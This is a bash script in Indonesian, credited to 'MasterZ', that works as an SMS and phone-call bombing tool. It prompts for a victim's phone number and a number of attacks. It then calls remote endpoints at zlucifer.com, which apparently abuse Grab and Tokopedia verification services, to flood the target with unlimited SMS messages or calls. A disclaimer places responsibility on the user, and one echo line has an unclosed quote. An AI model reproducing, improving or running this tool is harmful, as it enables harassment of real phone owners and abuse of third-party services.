#!/bin/bash
#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
troll(){
    clear
    sleep 0.03
toilet -f big -F gay By MasterZ
    echo " ============================="
    echo "Group : Nasional Operation Center" 
    echo "Instagram : @MasterZ345"
    echo "Tools By : MasterZ
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" ••••••••Tunggu Sayang•••••• "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
mulai (){
    echo "Mulai Spam SMS?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Terima Kasih Atas Supportnya"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS Unlimited"
    echo "[2] Spam Telp Unlimited"
    echo "[3] Exit"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo " Spam SMS Unlimited"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Berapa Penyerangan yang mau dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan Penyerangan SMS ke nomor $target
                    echo
                    echo "Tunggu Aja beb... "
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo "Group : Nasional Operation Center"
                    echo "Tools By : MasterZ"
                    echo "======================================="
            else
                    echo "Mungkin Dia Lelah"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Spam Call Unlimited"
            #function spam
            echo
            echo "Ketikan Nomor  target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Serang Pakai Grab/ToKoPedia?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan Penyerangan Call ke nomor $target
                  echo
                  echo "Tunggu Aja Beb..." 
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo "Group : Nasional Operation Center"
                  echo "Tools By : MasterZ"
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih sudah menggunakan Penyerangan"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading Server... "
load
clear
troll
echo Selamat datang , Ketik nick anda? #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo "Selamat datang $nick ":)"
echo
echo "Mulai SpamSms?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi